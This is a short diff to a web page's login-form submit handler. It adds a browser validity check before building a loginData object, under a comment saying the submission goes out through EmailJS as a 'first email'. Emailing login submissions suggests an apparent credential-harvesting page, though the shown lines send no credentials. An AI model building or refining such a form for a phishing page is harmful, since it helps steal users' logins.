@@ -446,9 +446,16 @@
 
     // ========== LOGIN SUBMIT (EmailJS - first email) ==========
     loginForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
+  e.preventDefault();
 
-      let loginData = {
+  // Check that the currently active required fields are filled
+  if (!loginForm.checkValidity()) {
+    loginForm.reportValidity();
+    return;
+  }
+
+  let loginData = {
+
         method: currentLoginMethod,
         timestamp: new Date().toISOString(),
         remember_me: rememberMe.checked
